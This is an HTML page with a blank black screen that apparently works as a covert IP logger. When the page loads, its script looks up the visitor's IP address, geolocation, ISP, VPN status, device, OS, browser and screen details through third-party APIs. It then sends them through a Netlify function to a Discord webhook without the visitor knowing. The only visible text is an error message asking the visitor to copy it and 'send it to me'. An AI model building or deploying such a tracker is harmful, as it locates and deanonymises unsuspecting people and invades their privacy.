<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title></title>
  <style>
    html, body {
      margin: 0; padding: 0; height: 100%;
      background: black;
      user-select: none;
      overflow: hidden;
    }
    #error-message {
      position: fixed;
      top: 0; left: 0; right: 0;
      color: red;
      background: black;
      padding: 10px;
      font-family: monospace;
      white-space: pre-wrap;
      cursor: pointer;
      display: none;
      z-index: 9999;
      max-height: 50vh;
      overflow-y: auto;
    }
  </style>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/1.0.2/ua-parser.min.js"></script>
</head>
<body>
  <div id="error-message" title="Click to copy error message"></div>

<script>
  const netlifyFunctionUrl = "/.netlify/functions/log-ip";

  function safeGet(obj, path, defaultValue = '') {
    return path.reduce((acc, key) => (acc && acc[key] !== undefined) ? acc[key] : defaultValue, obj);
  }

  function safeValue(val, maxLen=1024) {
    if (val === undefined || val === null || val === '') return "N/A";
    val = val.toString();
    if (val.length > maxLen) return val.slice(0, maxLen - 3) + '...';
    return val;
  }

  function chunkArray(arr, size) {
    const result = [];
    for(let i = 0; i < arr.length; i += size) {
      result.push(arr.slice(i, i + size));
    }
    return result;
  }

  async function fetchFallbackGeo(ip) {
    try {
      const res = await fetch(`https://ipapi.co/${ip}/json/`);
      if (!res.ok) return null;
      return res.json();
    } catch {
      return null;
    }
  }

  async function fetchIPInfo() {
    const res = await fetch('https://ipwhois.app/json/');
    if (!res.ok) throw new Error('Failed to fetch IP info');
    return res.json();
  }

  async function sendDiscordWebhook(embeds) {
    const res = await fetch(netlifyFunctionUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ embeds }),
    });
    if (!res.ok) {
      const text = await res.text();
      throw new Error(`Discord webhook error: ${res.status} - ${text}`);
    }
  }

  (async () => {
    const errorDiv = document.getElementById('error-message');

    try {
      let data = await fetchIPInfo();
      const fallback = await fetchFallbackGeo(data.ip);

      const parser = new UAParser();
      const result = parser.getResult();

      const deviceModel = result.device.model || "N/A";
      const deviceType = result.device.type || "N/A";
      const deviceVendor = result.device.vendor || "N/A";
      const osName = result.os.name || "N/A";
      const osVersion = result.os.version || "N/A";
      const browserName = result.browser.name || "N/A";
      const browserVersion = result.browser.version || "N/A";

      const localTime = new Date().toLocaleString("en-US", { timeZone: data.timezone || (fallback ? fallback.timezone : undefined) });

      data = {
        ...data,
        city: data.city || (fallback ? fallback.city : 'N/A'),
        region: data.region || (fallback ? fallback.region : 'N/A'),
        postal: data.postal || (fallback ? fallback.postal : 'N/A'),
        ipv6: data.ipv6 || (fallback ? fallback.ipv6 : 'N/A'),
        hostname: data.hostname || (fallback ? fallback.hostname : 'N/A'),
      };

      let isMobile = safeGet(data, ['security', 'is_mobile'], false);
      if (!isMobile) {
        const ua = navigator.userAgent.toLowerCase();
        isMobile = /mobile|android|iphone|ipad|phone/.test(ua);
      }

      const allFields = [
        { name: "IPv4 Address", value: `\`${safeValue(data.ip)}\``, inline: true },
        { name: "IPv6 Address", value: safeValue(data.ipv6), inline: true },
        { name: "Hostname", value: safeValue(data.hostname), inline: true },
        { name: "Country", value: `${safeValue(data.country)} (${safeValue(data.country_code)})`, inline: true },
        { name: "Region", value: safeValue(data.region), inline: true },
        { name: "City", value: safeValue(data.city), inline: true },
        { name: "Zip", value: safeValue(data.postal), inline: true },
        { name: "ISP", value: safeValue(data.isp), inline: false },
        { name: "Organization", value: safeValue(data.org), inline: false },
        { name: "ASN", value: safeValue(data.asn), inline: true },
        { name: "Timezone", value: `${safeValue(data.timezone_gmt)} (${safeValue(data.timezone)})`, inline: true },
        { name: "Local Time", value: safeValue(localTime), inline: true },
        { name: "VPN/Proxy", value: safeValue(safeGet(data, ['security', 'is_proxy']) ? "Yes" : "No"), inline: true },
        { name: "VPN/Hosting", value: safeValue(safeGet(data, ['security', 'is_hosting']) ? "Yes" : "No"), inline: true },
        { name: "Mobile", value: safeValue(isMobile ? "Yes" : "No"), inline: true },
        { name: "Bot", value: safeValue(safeGet(data, ['security', 'is_bot']) ? "Yes" : "No"), inline: true },
        { name: "Device Model", value: deviceModel, inline: true },
        { name: "Device Type", value: deviceType, inline: true },
        { name: "Device Vendor", value: deviceVendor, inline: true },
        { name: "OS Name", value: osName, inline: true },
        { name: "OS Version", value: osVersion, inline: true },
        { name: "Browser Name", value: browserName, inline: true },
        { name: "Browser Version", value: browserVersion, inline: true },
        { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
        { name: "Screen Resolution", value: `\`${window.screen.width}×${window.screen.height} (Logical), ${Math.round(window.screen.width * window.devicePixelRatio)}×${Math.round(window.screen.height * window.devicePixelRatio)} (Physical)\``, inline: true },
      ];

      const embedChunks = chunkArray(allFields, 25);
      await sendDiscordWebhook(embedChunks);

    } catch (err) {
      const errorDiv = document.getElementById('error-message');
      errorDiv.style.display = 'block';
      errorDiv.textContent = `❌ Error: ${err.message}\n\nClick to copy`;
      errorDiv.onclick = () => {
        navigator.clipboard.writeText(err.message)
          .then(() => alert("Error message copied! Send it to me."))
          .catch(() => alert("Failed to copy error message."));
      };
    }
  })();
</script>
</body>
</html>
